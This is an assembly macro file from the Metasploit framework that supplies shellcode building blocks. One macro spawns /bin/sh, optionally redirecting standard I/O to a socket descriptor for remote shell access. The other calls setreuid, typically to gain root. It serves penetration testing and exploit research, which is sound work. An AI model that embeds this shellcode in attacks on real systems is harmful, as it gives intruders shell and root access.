;;
;
;        Name: generic
;        Type: Macro Set
;   Qualities: None
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision: 1628 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        This file provides a generic API of macros that can be used
;        by payloads.  No payloads are actually implemented within this
;        file.
;
; Macro List:
;
;        execve_binsh - Executes a command shell with flags
;        setreuid     - Set real/effective user id
;;
BITS 32

;;
; Define undefined assumptions
;;
%ifndef ASSUME_REG_EDX
%define ASSUME_REG_EDX -1
%endif
%ifndef ASSUME_REG_EAX
%define ASSUME_REG_EAX -1
%endif

;;
;     Macro: execve_binsh
;   Purpose: Execute a command shell with various options
; Arguments:
;
;    Execution flags: Flags used for executing the command shell in a 
;                     number of modes.
;
;        EXECUTE_REDIRECT_IO      => Redirects stdin/stdout/stderr to the fd
;                                    passed in 'edi'.
;;
%define EXECUTE_REDIRECT_IO      0x0001

%macro execve_binsh 1

	%if %1 & EXECUTE_REDIRECT_IO

dup:
%if ASSUME_REG_EDX != 2
	push byte 0x2
	pop  ecx
%endif
dup_loop:
%if ASSUME_REG_EAX == 0
	mov  al, 0x5a
%else
	push byte 0x5a
	pop  eax
%endif
%if ASSUME_REG_EDX == 2
	push edx
%else
	push ecx
%endif
%ifdef FD_REG_EBX
	push ebx
%else
	push edi
%endif
%if ASSUME_REG_EDX == 2
	push edx
%else
	push ecx
%endif
	int  0x80
%if ASSUME_REG_EDX == 2
	dec  edx
%else
	dec  ecx
%endif
	jns  dup_loop

	%undef  ASSUME_REG_EAX
	%define ASSUME_REG_EAX 0

	%endif

execve:
%if ASSUME_REG_EAX == 0
	push eax
%else
	push byte 0x3b
	pop  eax
	cdq
	push edx
%endif
	push dword 0x68732f2f
	push dword 0x6e69622f
	mov  ebx, esp
%if ASSUME_REG_EAX == 0
	push eax
%else
	push edx
%endif
	push esp
	push ebx
	push ebx
%if ASSUME_REG_EAX == 0
	mov  al, 0x3b
%endif
	int  0x80

%endmacro

;;
;     Macro: setreuid
;   Purpose: Set effective user id
; Arguments:
;
;    User ID: The user identifier to setreuid to, typically 0.
;;

%macro setreuid 1

setreuid:

	%if %1 == 0

	xor  eax, eax

	%else

		%if %1 < 256

		push byte %1

		%else

		push dword %1

		%endif

	pop  eax

	%endif

	push eax
	push eax
	mov  al, 0x7e
	push eax
	int  0x80

%endmacro
